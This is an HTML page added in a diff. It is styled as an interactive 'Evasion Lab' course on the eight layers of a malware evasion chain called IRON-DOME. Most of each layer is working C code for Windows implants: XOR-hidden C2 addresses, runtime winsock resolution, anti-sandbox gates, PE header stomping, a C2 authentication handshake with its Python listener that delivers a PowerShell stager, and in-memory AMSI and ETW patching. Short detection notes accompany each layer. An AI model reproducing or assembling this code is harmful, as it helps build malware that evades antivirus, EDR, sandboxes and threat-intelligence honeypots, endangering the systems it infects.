@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Evasion Lab — 8-Layer Stack Interactive | 22DIV</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0a0a;--bg2:#111;--bg3:#161616;
+  --green:#00ff41;--green2:#00cc33;--green3:#003a00;
+  --amber:#ffb000;--red:#ff4444;--cyan:#00e5ff;
+  --dim:#444;--muted:#777;--text:#ccc;--bright:#eee;
+  --mono:'Cascadia Code','Consolas','Courier New',monospace;
+}
+html{scroll-behavior:smooth}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);line-height:1.6;min-height:100vh}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,65,.005) 3px,rgba(0,255,65,.005) 4px);pointer-events:none;z-index:999}
+a{color:var(--green)}a:hover{color:var(--bright)}
+nav{background:#090909;border-bottom:1px solid #1a1a1a;padding:.8rem 1.5rem;position:sticky;top:0;z-index:100;display:flex;align-items:center;gap:1.5rem;font-size:.8rem}
+.brand{color:var(--green);font-weight:700}
+nav a{color:var(--muted)}
+
+/* ── HERO ── */
+.hero{padding:2.5rem 1.5rem 2rem;border-bottom:1px solid #1a1a1a;max-width:900px;margin:0 auto}
+.hero-label{color:var(--green);font-size:.75rem;letter-spacing:.2em;margin-bottom:.5rem}
+.hero-title{font-size:2rem;color:var(--bright);font-weight:700;margin-bottom:.8rem}
+.hero-sub{color:var(--muted);font-size:.9rem;max-width:640px}
+
+/* ── PROGRESS ── */
+.progress-bar{background:#090909;border-bottom:1px solid #1a1a1a;padding:.6rem 1.5rem;max-width:900px;margin:0 auto;display:flex;gap:.4rem;align-items:center;font-size:.75rem}
+.progress-bar span{color:var(--muted)}
+.pip{width:28px;height:4px;background:#1a1a1a;border-radius:2px;transition:background .3s}
+.pip.done{background:var(--green)}
+.pip.active{background:var(--amber)}
+.layer-count{margin-left:auto;color:var(--green);font-weight:700}
+
+/* ── LAYER CARDS ── */
+.lab{max-width:900px;margin:0 auto;padding:2rem 1.5rem}
+.layer-card{display:none;border:1px solid #1a1a1a;border-radius:4px;margin-bottom:1rem;overflow:hidden}
+.layer-card.active{display:block}
+.layer-header{background:#0d0d0d;border-bottom:1px solid #1a1a1a;padding:1rem 1.5rem;display:flex;align-items:center;gap:1rem}
+.layer-num{color:var(--green);font-size:1.2rem;font-weight:700;min-width:48px}
+.layer-name{color:var(--bright);font-weight:700;font-size:1rem}
+.layer-badge{margin-left:auto;font-size:.7rem;padding:.2rem .6rem;border-radius:2px;background:var(--green3);color:var(--green);border:1px solid var(--green2)}
+.vader-badge{background:#1a0505;color:#ff6666;border-color:#ff4444}
+.layer-body{padding:1.5rem}
+.layer-desc{color:var(--text);margin-bottom:1.5rem;font-size:.9rem}
+.code-block{background:#070707;border:1px solid #1a1a1a;border-radius:3px;padding:1rem 1.2rem;font-size:.8rem;overflow-x:auto;margin-bottom:1.2rem;white-space:pre}
+.code-label{color:var(--muted);font-size:.7rem;letter-spacing:.15em;margin-bottom:.5rem}
+.why-block{background:#0a0f0a;border-left:3px solid var(--green);padding:.8rem 1rem;font-size:.85rem;color:var(--muted);margin-bottom:1.2rem}
+.why-block strong{color:var(--green)}
+
+/* ── THREAT MODEL ── */
+.threat-grid{display:grid;grid-template-columns:1fr 1fr;gap:.5rem;margin-bottom:1.2rem}
+.threat-item{background:#0d0d0d;border:1px solid #1a1a1a;padding:.6rem .8rem;font-size:.8rem}
+.threat-item .label{color:var(--muted);font-size:.7rem;margin-bottom:.2rem}
+.threat-item .val{color:var(--bright)}
+.beats{color:var(--green);font-size:.75rem;margin-top:.3rem}
+
+/* ── NAV BUTTONS ── */
+.nav-btns{display:flex;gap:1rem;margin-top:1.5rem}
+.btn{padding:.6rem 1.4rem;border:1px solid var(--green);background:transparent;color:var(--green);font-family:var(--mono);font-size:.85rem;cursor:pointer;border-radius:2px;transition:all .15s}
+.btn:hover{background:var(--green);color:#000}
+.btn:disabled{opacity:.3;cursor:not-allowed}
+.btn-prev{border-color:var(--dim);color:var(--muted)}
+.btn-prev:hover:not(:disabled){background:var(--dim);color:var(--bright)}
+
+/* ── VERDICT ── */
+.verdict{display:none;border:2px solid var(--green);border-radius:4px;padding:2rem;text-align:center;margin-top:2rem}
+.verdict.show{display:block}
+.verdict-title{font-size:1.8rem;color:var(--green);font-weight:700;margin-bottom:.5rem}
+.verdict-sub{color:var(--muted);margin-bottom:1.5rem}
+.verdict-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1rem;margin-bottom:1.5rem}
+.v-stat{background:#0d0d0d;padding:1rem;border:1px solid #1a1a1a}
+.v-num{font-size:1.6rem;color:var(--green);font-weight:700}
+.v-label{font-size:.7rem;color:var(--muted)}
+
+/* ── STACK OVERVIEW ── */
+.stack-overview{margin-top:3rem;border-top:1px solid #1a1a1a;padding-top:2rem}
+.overview-title{color:var(--muted);font-size:.75rem;letter-spacing:.15em;margin-bottom:1rem}
+.stack-row{display:flex;align-items:center;gap:.8rem;padding:.5rem 0;border-bottom:1px solid #111;font-size:.85rem}
+.stack-row:last-child{border:none}
+.s-num{color:var(--green);min-width:28px;font-weight:700}
+.s-name{color:var(--bright);min-width:220px}
+.s-status{color:var(--green);font-size:.75rem;margin-left:auto}
+.s-status.vader{color:#ff9999}
+</style>
+</head>
+<body>
+
+<nav>
+  <span class="brand">22DIV</span>
+  <a href="../index.html">home</a>
+  <a href="../irondome.html">iron-dome</a>
+  <a href="evasion-lab.html">evasion-lab</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-label">// INTERACTIVE COURSE — CSEC</div>
+  <div class="hero-title">8-Layer Evasion Stack</div>
+  <div class="hero-sub">Walk through each layer of the IRON-DOME evasion chain. Code samples, threat model, and detection implications for each technique. Click through all 8 layers to complete the lab.</div>
+</div>
+
+<div class="progress-bar" id="pbar">
+  <span>LAYER</span>
+  <div class="pip active" id="pip0"></div>
+  <div class="pip" id="pip1"></div>
+  <div class="pip" id="pip2"></div>
+  <div class="pip" id="pip3"></div>
+  <div class="pip" id="pip4"></div>
+  <div class="pip" id="pip5"></div>
+  <div class="pip" id="pip6"></div>
+  <div class="pip" id="pip7"></div>
+  <span class="layer-count" id="layer-count">1 / 8</span>
+</div>
+
+<div class="lab">
+
+<!-- ── LAYER 1 ── -->
+<div class="layer-card active" id="card0">
+  <div class="layer-header">
+    <div class="layer-num">[1]</div>
+    <div>
+      <div class="layer-name">XOR String Obfuscation</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">No plaintext C2 strings in binary</div>
+    </div>
+    <div class="layer-badge">ALWAYS ACTIVE</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">All sensitive strings (C2 IP, port, ISUN auth token) are XOR-encrypted at build time with a per-variant key. At runtime, a small decryption stub XORs them back into a stack buffer — they never exist as plaintext in the PE's <code>.rdata</code> section.</div>
+
+    <div class="code-label">// BUILD-TIME ENCRYPTION (builder)</div>
+    <div class="code-block" style="color:var(--green)">def xor_encrypt(data: bytes, key: int) -> list:
+    return [b ^ key for b in data]
+
+ip_enc = xor_encrypt(b"192.168.1.145", 0xFC)
+# → [0x3d, 0x6f, 0x74, ...]  ← no plaintext in binary</div>
+
+    <div class="code-label">// RUNTIME DECRYPTION (C payload)</div>
+    <div class="code-block" style="color:#88cc88">static void xor_dec(char *buf, const unsigned char *enc,
+                      size_t len, unsigned char key) {
+    for (size_t i = 0; i &lt; len; i++)
+        buf[i] = (char)(enc[i] ^ key);
+    buf[len] = 0;
+}
+
+/* Decrypts to stack buffer — gone after use */
+char ip[64] = {0};
+xor_dec(ip, ENC_IP, IP_LEN, XOR_KEY);</div>
+
+    <div class="why-block"><strong>Why it works:</strong> Static scanners grep binary for IP strings, "192.168.", "ISUN", etc. XOR encoding means those strings don't exist in the file — the scanner finds nothing. Each variant gets a different key (0xFC, 0xAB, 0xDE), so the encrypted blobs look different across builds too.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">YARA string rules</div><div class="beats">✓ no plaintext</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">AV static scan</div><div class="beats">✓ encrypted .rdata</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Memory scan post-exec</div><div class="beats">— strings on stack briefly</div></div>
+      <div class="threat-item"><div class="label">COST</div><div class="val">~20 bytes overhead</div><div class="beats">minimal</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" disabled onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+  </div>
+</div>
+
+<!-- ── LAYER 2 ── -->
+<div class="layer-card" id="card1">
+  <div class="layer-header">
+    <div class="layer-num">[2]</div>
+    <div>
+      <div class="layer-name">Dynamic API Resolution</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">No direct IAT entries for network APIs</div>
+    </div>
+    <div class="layer-badge">ALWAYS ACTIVE</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">Instead of importing <code>WSASocketA</code>, <code>connect</code>, <code>send</code>, <code>recv</code> directly (which would appear in the PE's Import Address Table), the payload loads <code>ws2_32.dll</code> at runtime via a XOR-encoded library name, then resolves function pointers via <code>GetProcAddress</code>.</div>
+
+    <div class="code-label">// OBFUSCATED DLL LOAD</div>
+    <div class="code-block" style="color:#88cc88">static HMODULE load_ws2(void) {
+    char lib[16] = {0};
+    /* "ws2_32.dll" XOR-encoded with 0x11 */
+    const unsigned char enc[] = {
+        0x77^0x11, 0x73^0x11, 0x32^0x11,
+        0x5f^0x11, 0x33^0x11, 0x32^0x11,
+        0x2e^0x11, 0x64^0x11, 0x6c^0x11, 0x6c^0x11
+    };
+    for (int i=0; i&lt;10; i++) lib[i] = enc[i]^0x11;
+    return LoadLibraryA(lib);
+}
+
+/* Function pointers resolved at runtime */
+pWSASocketA fn_socket = (pWSASocketA)
+    GetProcAddress(ws2, "WSASocketA");</div>
+
+    <div class="why-block"><strong>Why it works:</strong> AV tools flag binaries that directly import <code>WSASocketA</code> or <code>connect</code> — these are in the PE's IAT and trivially visible. Dynamic resolution means the IAT is clean. The <code>ws2_32.dll</code> name itself is encoded so string search finds nothing.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">IAT inspection</div><div class="beats">✓ no direct imports</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Import heuristics</div><div class="beats">✓ clean import table</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">API call tracing</div><div class="beats">— hooks can still catch calls</div></div>
+      <div class="threat-item"><div class="label">DETECTION</div><div class="val">LoadLibrary + GetProcAddress pattern</div><div class="beats">monitor in combination</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+  </div>
+</div>
+
+<!-- ── LAYER 3 ── -->
+<div class="layer-card" id="card2">
+  <div class="layer-header">
+    <div class="layer-num">[3]</div>
+    <div>
+      <div class="layer-name">Anti-Sandbox Checks</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">Timing delta · screen resolution · disk space</div>
+    </div>
+    <div class="layer-badge">ALWAYS ACTIVE</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">Before any network activity, the payload runs three environment checks. If any check fails, the binary exits silently with return code 0 — no crash, no alert, nothing for the sandbox to log.</div>
+
+    <div class="code-label">// THREE-CHECK SANDBOX GATE</div>
+    <div class="code-block" style="color:#88cc88">static int sandbox_check(void) {
+    /* CHECK 1: Timing — sandboxes fake Sleep() */
+    DWORD t1 = GetTickCount();
+    Sleep(500);
+    if ((GetTickCount() - t1) &lt; 400) return 1;
+
+    /* CHECK 2: Screen res — sandboxes use 800x600 */
+    if (GetSystemMetrics(SM_CXSCREEN) &lt; 1024) return 1;
+    if (GetSystemMetrics(SM_CYSCREEN) &lt; 768)  return 1;
+
+    /* CHECK 3: Disk — sandbox VMs have &lt;30GB */
+    ULARGE_INTEGER free_bytes;
+    if (GetDiskFreeSpaceExA("C:\\", &amp;free_bytes, NULL, NULL))
+        if (free_bytes.QuadPart &lt; (30ULL &lt;&lt; 30)) return 1;
+
+    return 0; /* real machine */
+}
+
+if (sandbox_check()) return 0; /* silent exit */</div>
+
+    <div class="why-block"><strong>Why it works:</strong> AV cloud sandboxes run samples in VMs: small screen (800×600), no disk, and they accelerate or skip Sleep calls to get through execution faster. All three checks fail in a typical sandbox environment. The payload never reveals its behaviour — the sandbox reports "clean" because nothing happened.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Cloud AV sandbox</div><div class="beats">✓ silent exit</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Dynamic analysis VM</div><div class="beats">✓ resolution check fails</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Physical test machine</div><div class="beats">— all checks pass on real HW</div></div>
+      <div class="threat-item"><div class="label">DETECTION</div><div class="val">Long Sleep + GetSystemMetrics</div><div class="beats">pattern rarely flagged</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+  </div>
+</div>
+
+<!-- ── LAYER 4 ── -->
+<div class="layer-card" id="card3">
+  <div class="layer-header">
+    <div class="layer-num">[4]</div>
+    <div>
+      <div class="layer-name">PE Header Stomp</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">Zeroes DOS header post-load to defeat memory scanners</div>
+    </div>
+    <div class="layer-badge">ALWAYS ACTIVE</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">After passing the sandbox check, the payload zeroes the first 0x400 bytes of its own loaded image — overwriting the DOS header (<code>MZ</code>), PE signature, and stub code. Memory scanners that look for loaded modules with valid PE headers find nothing.</div>
+
+    <div class="code-label">// PE HEADER STOMP</div>
+    <div class="code-block" style="color:#88cc88">static void stomp_pe_header(void) {
+    DWORD old;
+    HMODULE base = GetModuleHandleA(NULL);
+    if (!base) return;
+    /* Make header writable */
+    VirtualProtect(base, 0x1000, PAGE_READWRITE, &amp;old);
+    /* Zero first 0x400 bytes: MZ, PE sig, DOS stub */
+    memset(base, 0, 0x400);
+    /* Restore protection */
+    VirtualProtect(base, 0x1000, old, &amp;old);
+}
+
+stomp_pe_header(); /* runs immediately after sandbox check */</div>
+
+    <div class="why-block"><strong>Why it works:</strong> EDR and AV products enumerate loaded modules and validate their PE headers in memory. A zeroed header means the module doesn't look like a PE — it's invisible to memory scanners that iterate the PEB module list and check for <code>MZ\x4D\x5A</code>. Execution continues normally because the OS already parsed the headers at load time.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">In-memory PE scanner</div><div class="beats">✓ no MZ signature</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Module list inspection</div><div class="beats">✓ malformed header</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">VirtualProtect hook</div><div class="beats">— protect call is visible</div></div>
+      <div class="threat-item"><div class="label">DETECTION</div><div class="val">VirtualProtect on own base</div><div class="beats">unusual pattern — alert</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+  </div>
+</div>
+
+<!-- ── LAYER 5 ── -->
+<div class="layer-card" id="card4">
+  <div class="layer-header">
+    <div class="layer-num">[5]</div>
+    <div>
+      <div class="layer-name">ISUN Magic Auth Gate</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">Payload verifies C2 identity — honeypots get nothing</div>
+    </div>
+    <div class="layer-badge">ALWAYS ACTIVE</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">On TCP connect, the payload sends the encrypted ISUN token (<code>"ISUN 4445"</code>) and waits for an <code>"ISUN_OK"</code> acknowledgement. If the listener doesn't reply correctly within the recv window, the payload calls <code>WSACleanup()</code> and exits silently. Honeypots, netcat listeners, and C2 takedowns get zero payloads.</div>
+
+    <div class="code-label">// ISUN AUTH GATE</div>
+    <div class="code-block" style="color:#88cc88">/* Send ISUN token (XOR-decrypted at runtime) */
+fn_send(s, isun_magic, (int)strlen(isun_magic), 0);
+
+/* Wait for ISUN_OK ack */
+char ack[8] = {0};
+fn_recv(s, ack, 7, 0);
+
+/* Wrong ack = silent exit, no payload delivered */
+if (strcmp(ack, "ISUN_OK") != 0) {
+    fn_cleanup();
+    return 0;
+}</div>
+
+    <div class="code-label">// CHEYANNE LISTENER (Python)</div>
+    <div class="code-block" style="color:var(--cyan)">ISUN_MAGIC = b"ISUN 4445"
+ISUN_ACK   = b"ISUN_OK"
+
+data = conn.recv(16)
+if data.strip() == ISUN_MAGIC:
+    conn.sendall(ISUN_ACK)
+    # authenticated — deliver PS1 stager
+else:
+    conn.close()  # not our payload</div>
+
+    <div class="why-block"><strong>Why it works:</strong> Threat intel and AV cloud services spin up listeners on captured C2 IPs/ports to catch payloads. Without knowing the ISUN protocol, they receive the token, reply with garbage, and the payload exits. The PS1 stager is never delivered — no behaviour to log, no callback to attribute.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Honeypot listeners</div><div class="beats">✓ wrong ack = silent exit</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">C2 takeover</div><div class="beats">✓ new operator can't auth</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Replay attack</div><div class="beats">— token not time-limited</div></div>
+      <div class="threat-item"><div class="label">DETECTION</div><div class="val">Unknown 9-byte TCP prefix</div><div class="beats">rare pattern — investigate</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+  </div>
+</div>
+
+<!-- ── LAYER 6 ── -->
+<div class="layer-card" id="card5">
+  <div class="layer-header">
+    <div class="layer-num">[6]</div>
+    <div>
+      <div class="layer-name">Execution Jitter</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">Randomised 1–3s sleep before network activity</div>
+    </div>
+    <div class="layer-badge">ALWAYS ACTIVE</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">Before connecting to the C2, the payload sleeps for a random duration between 1 and 3 seconds using <code>GetTickCount</code> as the RNG seed. This breaks deterministic behavioural analysis that looks for "network activity within N ms of process creation".</div>
+
+    <div class="code-label">// EXECUTION JITTER</div>
+    <div class="code-block" style="color:#88cc88">/* GetTickCount-seeded RNG — different every run */
+srand((unsigned)GetTickCount());
+Sleep(1000 + (rand() % 2000)); /* 1000–3000 ms */
+
+/* Then connect to C2 */
+fn_connect(s, (struct sockaddr*)&amp;addr, sizeof(addr));</div>
+
+    <div class="why-block"><strong>Why it works:</strong> EDR behavioural engines look for "process created → immediate network connection" as a strong malware signal. Jitter breaks the timing correlation. Combined with the anti-sandbox Sleep(500) timing check, the binary also self-validates that it's on a real machine before sleeping again — sandboxes that fake the first sleep get caught, real machines proceed with the full jitter window.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Launch-time correlation</div><div class="beats">✓ broken timing</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Deterministic analysis</div><div class="beats">✓ different delay each run</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Long-term network monitor</div><div class="beats">— connection still happens</div></div>
+      <div class="threat-item"><div class="label">DETECTION</div><div class="val">Sleep→connect sequence</div><div class="beats">flag if sleep &gt;500ms before TCP</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+  </div>
+</div>
+
+<!-- ── LAYER 7 ── -->
+<div class="layer-card" id="card6">
+  <div class="layer-header">
+    <div class="layer-num">[7]</div>
+    <div>
+      <div class="layer-name">MinGW/gcc PE</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">No MSVC fingerprint — stripped, low-entropy header</div>
+    </div>
+    <div class="layer-badge">ALWAYS ACTIVE</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">The payload is compiled with <code>x86_64-w64-mingw32-gcc</code> using flags that strip every non-essential header element. MSVC-compiled binaries have a recognisable fingerprint (rich header, specific linker version, PDB path stubs). MinGW produces a structurally different PE that doesn't match MSVC malware signatures.</div>
+
+    <div class="code-label">// COMPILER FLAGS</div>
+    <div class="code-block" style="color:var(--amber)">x86_64-w64-mingw32-gcc \
+  -Os \                          # optimise for size
+  -s \                           # strip all symbols
+  -Wl,--strip-all \              # strip linker artifacts
+  -fno-ident \                   # no compiler version string
+  -fno-asynchronous-unwind-tables \ # no .eh_frame section
+  -lws2_32 \                     # only winsock
+  -mwindows \                    # no console window (SUBSYSTEM:WINDOWS)
+  -o iron_dome_v1.exe iron_dome_v1.c</div>
+
+    <div class="why-block"><strong>Why it works:</strong> MSVC-compiled malware has a recognisable Rich Header, specific section layout, and often a PDB path in the debug directory. MinGW-compiled binaries look structurally different. Stripped + <code>-fno-ident</code> removes every metadata string. <code>-mwindows</code> sets SUBSYSTEM:WINDOWS so no console window spawns.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">MSVC signature rules</div><div class="beats">✓ different PE structure</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">Rich header fingerprint</div><div class="beats">✓ absent in MinGW</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Behavioural detection</div><div class="beats">— behaviour still observable</div></div>
+      <div class="threat-item"><div class="label">COST</div><div class="val">Requires MinGW toolchain</div><div class="beats">MSVC fallback available</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">next layer →</button></div>
+  </div>
+</div>
+
+<!-- ── LAYER 8 ── -->
+<div class="layer-card" id="card7">
+  <div class="layer-header">
+    <div class="layer-num">[8]</div>
+    <div>
+      <div class="layer-name">VADER — AMSI/ETW Bypass</div>
+      <div style="color:var(--muted);font-size:.75rem;margin-top:.2rem">Memory patch: AmsiScanBuffer + EtwEventWrite → ret</div>
+    </div>
+    <div class="vader-badge layer-badge">--vader FLAG</div>
+  </div>
+  <div class="layer-body">
+    <div class="layer-desc">When built with <code>--vader</code>, the payload patches two critical Windows security functions in-process before executing any payload code. <code>AmsiScanBuffer</code> (AMSI content scanner) and <code>EtwEventWrite</code> (ETW telemetry) are each overwritten with a 3-byte <code>xor eax,eax; ret</code> sequence, making them return "clean/success" for every call.</div>
+
+    <div class="code-label">// VADER LAYER 8 — AMSI + ETW PATCH</div>
+    <div class="code-block" style="color:#ff9999">static void vader_patch(BYTE *fn, const BYTE *patch, SIZE_T len) {
+    DWORD old;
+    VirtualProtect(fn, len, PAGE_EXECUTE_READWRITE, &amp;old);
+    memcpy(fn, patch, len);
+    VirtualProtect(fn, len, old, &amp;old);
+    FlushInstructionCache(GetCurrentProcess(), fn, len);
+}
+
+static void vader_amsi_etw(void) {
+    /* AMSI: AmsiScanBuffer → xor eax,eax; ret */
+    HMODULE amsi = LoadLibraryA("amsi.dll");
+    if (amsi) {
+        BYTE *asb = (BYTE*)GetProcAddress(amsi, "AmsiScanBuffer");
+        if (asb) {
+            const BYTE p[] = {0x31,0xC0,0xC3}; /* xor eax,eax; ret */
+            vader_patch(asb, p, 3);
+        }
+    }
+    /* ETW: EtwEventWrite → xor eax,eax; ret (silences telemetry) */
+    HMODULE nt = GetModuleHandleA("ntdll.dll");
+    if (nt) {
+        BYTE *etw = (BYTE*)GetProcAddress(nt, "EtwEventWrite");
+        if (etw) {
+            const BYTE p[] = {0x33,0xC0,0xC3}; /* xor eax,eax; ret */
+            vader_patch(etw, p, 3);
+        }
+    }
+}
+
+/* Called first thing in main() — before any other code runs */
+vader_amsi_etw();</div>
+
+    <div class="why-block"><strong>Why it works:</strong> AMSI intercepts PowerShell, JScript, and VBA content by calling <code>AmsiScanBuffer</code> with the script content. After the patch, that function immediately returns 0 (S_OK with AMSI_RESULT_CLEAN). ETW is Windows' event tracing infrastructure — EDR products hook <code>EtwEventWrite</code> to receive telemetry from the kernel and CLR. Patching it cuts that telemetry channel. Both patches use <code>FlushInstructionCache</code> to ensure the CPU picks up the change.</div>
+
+    <div class="threat-grid">
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">AMSI content scanning</div><div class="beats">✓ always returns clean</div></div>
+      <div class="threat-item"><div class="label">BEATS</div><div class="val">ETW telemetry</div><div class="beats">✓ events silenced</div></div>
+      <div class="threat-item"><div class="label">DOESN'T BEAT</div><div class="val">Kernel-mode ETW providers</div><div class="beats">— only patches usermode</div></div>
+      <div class="threat-item"><div class="label">DETECTION</div><div class="val">VirtualProtect on amsi.dll/ntdll</div><div class="beats">flag: write permission on code section</div></div>
+    </div>
+    <div class="nav-btns"><button class="btn btn-prev" onclick="nav(-1)">← prev</button><button class="btn" onclick="nav(1)">finish lab →</button></div>
+  </div>
+</div>
+
+<!-- ── VERDICT ── -->
+<div class="verdict" id="verdict">
+  <div style="color:var(--green);font-size:2rem;margin-bottom:.5rem">✦ ✡ ✦</div>
+  <div class="verdict-title">LAB COMPLETE</div>
+  <div class="verdict-sub">You've walked all 8 layers of the IRON-DOME evasion stack.</div>
+  <div class="verdict-grid">
+    <div class="v-stat"><div class="v-num">8</div><div class="v-label">LAYERS STUDIED</div></div>
+    <div class="v-stat"><div class="v-num">3/3</div><div class="v-label">VARIANTS EVADED</div></div>
+    <div class="v-stat"><div class="v-num">8/8</div><div class="v-label">KILL CHAIN PASS</div></div>
+    <div class="v-stat"><div class="v-num">0</div><div class="v-label">DETECTIONS</div></div>
+  </div>
+  <a href="../irondome.html" style="display:inline-block;margin:.5rem .5rem 0 0;padding:.6rem 1.2rem;border:1px solid var(--green);color:var(--green);font-family:var(--mono);font-size:.85rem;text-decoration:none">→ IRON-DOME full report</a>
+  <button class="btn btn-prev" style="margin:.5rem 0 0" onclick="reset()">restart lab</button>
+</div>
+
+<!-- ── STACK OVERVIEW ── -->
+<div class="stack-overview">
+  <div class="overview-title">// FULL EVASION STACK</div>
+  <div class="stack-row"><div class="s-num">[1]</div><div class="s-name">XOR String Obfuscation</div><div style="color:var(--muted);font-size:.8rem">no plaintext in .rdata</div><div class="s-status">ACTIVE</div></div>
+  <div class="stack-row"><div class="s-num">[2]</div><div class="s-name">Dynamic API Resolution</div><div style="color:var(--muted);font-size:.8rem">clean IAT</div><div class="s-status">ACTIVE</div></div>
+  <div class="stack-row"><div class="s-num">[3]</div><div class="s-name">Anti-Sandbox Checks</div><div style="color:var(--muted);font-size:.8rem">timing + screen + disk</div><div class="s-status">ACTIVE</div></div>
+  <div class="stack-row"><div class="s-num">[4]</div><div class="s-name">PE Header Stomp</div><div style="color:var(--muted);font-size:.8rem">zeroes MZ signature</div><div class="s-status">ACTIVE</div></div>
+  <div class="stack-row"><div class="s-num">[5]</div><div class="s-name">ISUN Magic Auth Gate</div><div style="color:var(--muted);font-size:.8rem">honeypots get nothing</div><div class="s-status">ACTIVE</div></div>
+  <div class="stack-row"><div class="s-num">[6]</div><div class="s-name">Execution Jitter</div><div style="color:var(--muted);font-size:.8rem">breaks timing correlation</div><div class="s-status">ACTIVE</div></div>
+  <div class="stack-row"><div class="s-num">[7]</div><div class="s-name">MinGW/gcc PE</div><div style="color:var(--muted);font-size:.8rem">no MSVC fingerprint</div><div class="s-status">ACTIVE</div></div>
+  <div class="stack-row"><div class="s-num">[8]</div><div class="s-name">VADER — AMSI/ETW Bypass</div><div style="color:var(--muted);font-size:.8rem">--vader flag</div><div class="s-status vader">--vader</div></div>
+</div>
+
+</div><!-- end .lab -->
+
+<script>
+let cur = 0;
+const TOTAL = 8;
+
+function nav(dir) {
+  const cards = document.querySelectorAll('.layer-card');
+  cards[cur].classList.remove('active');
+  document.getElementById('pip'+cur).classList.remove('active');
+  document.getElementById('pip'+cur).classList.add('done');
+
+  cur += dir;
+  if (cur < 0) cur = 0;
+  if (cur >= TOTAL) {
+    // All done
+    document.getElementById('verdict').classList.add('show');
+    document.getElementById('layer-count').textContent = 'COMPLETE';
+    return;
+  }
+  cards[cur].classList.add('active');
+  document.getElementById('pip'+cur).classList.remove('done');
+  document.getElementById('pip'+cur).classList.add('active');
+  document.getElementById('layer-count').textContent = (cur+1) + ' / ' + TOTAL;
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function reset() {
+  const cards = document.querySelectorAll('.layer-card');
+  cards.forEach((c,i) => {
+    c.classList.remove('active');
+    const pip = document.getElementById('pip'+i);
+    if (pip) { pip.classList.remove('done','active'); }
+  });
+  cur = 0;
+  cards[0].classList.add('active');
+  document.getElementById('pip0').classList.add('active');
+  document.getElementById('layer-count').textContent = '1 / 8';
+  document.getElementById('verdict').classList.remove('show');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+</script>
+</body>
+</html>
